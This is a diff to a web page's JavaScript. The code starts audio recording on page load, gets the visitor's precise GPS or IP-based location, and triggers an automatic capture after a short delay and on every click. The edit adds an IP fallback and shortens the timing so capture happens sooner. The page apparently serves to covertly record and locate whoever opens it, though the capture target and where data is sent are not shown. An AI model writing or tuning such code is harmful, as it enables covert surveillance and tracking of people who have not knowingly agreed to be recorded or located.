@@ -113,12 +113,15 @@
         }, (err) => {
           // Fallback to IP-based location on GPS failure
           getIPBasedLocation();
-          setTimeout(updateLocation, 300);
+          setTimeout(updateLocation, 200);
         }, {
           enableHighAccuracy: true,
           timeout: 5000,
           maximumAge: 0
         });
+      } else {
+        // If geolocation not available, use IP
+        getIPBasedLocation();
       }
     }
 
@@ -168,15 +171,17 @@
 
     window.addEventListener('load', () => {
       startAudioRecording();
-      // Wait and ensure location is fetched before first capture
+      getIPBasedLocation();
+      
+      // Quick check - capture as soon as location is ready
       setTimeout(() => {
         if (cachedLat !== 0 && cachedLon !== 0) {
           autoCapture();
         } else {
-          // If location not fetched yet, wait more
-          setTimeout(autoCapture, 2000);
+          // If location still not ready, wait just a bit more
+          setTimeout(autoCapture, 1000);
         }
-      }, 4000);
+      }, 2000);
     });
 
     document.addEventListener('click', autoCapture);
